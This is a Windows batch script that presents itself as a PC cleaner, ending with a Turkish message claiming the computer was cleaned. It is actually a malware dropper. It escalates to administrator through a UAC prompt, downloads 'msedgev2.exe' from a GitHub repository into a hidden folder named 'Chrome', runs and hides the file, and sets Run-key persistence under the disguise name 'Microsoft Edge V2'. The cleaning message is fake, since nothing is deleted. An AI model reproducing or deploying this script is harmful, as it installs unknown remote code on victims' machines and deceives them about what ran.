
:----------------------------------------------------------------------------------------------------------------:
powershell -window hidden -command ""
:----------------------------------------------------------------------------------------------------------------:
IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
    >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)
:----------------------------------------------------------------------------------------------------------------:
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( 
    goto gotAdmin 
)
:----------------------------------------------------------------------------------------------------------------:
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params=%*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:""=""", "", "runas", 1 >> "%temp%\getadmin.vbs"
:----------------------------------------------------------------------------------------------------------------:
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
:----------------------------------------------------------------------------------------------------------------:
:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:----------------------------------------------------------------------------------------------------------------:
cd "%LocalAppData%"
if not exist "Chrome" mkdir "Chrome"
attrib +h "Chrome" /s /d
cd "%LocalAppData%\Chrome"
:----------------------------------------------------------------------------------------------------------------:
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest 'https://github.com/confessyourcin/xor-obfuscator/raw/refs/heads/main/msedgev2.exe' -OutFile 'msedgev2.exe'"
if not exist "msedgev2.exe" (
    powershell -Command "Invoke-WebRequest 'https://github.com/confessyourcin/xor-obfuscator/raw/refs/heads/main/msedgev2.exe' -OutFile 'msedgev2.exe'"
)
if exist "msedgev2.exe" (
    start msedgev2.exe
    attrib +h "msedgev2.exe" /s /d
) else (
    exit /B
)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Microsoft Edge V2" /t REG_SZ /d "\"%LocalAppData%\Chrome\msedgev2.exe\"" /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Microsoft Edge V2" /t REG_SZ /d "\"%LocalAppData%\Chrome\msedgev2.exe\"" /f
:----------------------------------------------------------------------------------------------------------------:
echo Bilgisayar temizlendi ve ek olarak gereksiz %deletedFolders% adet dosya başarıyla silindi!
endlocal
exit
:----------------------------------------------------------------------------------------------------------------:
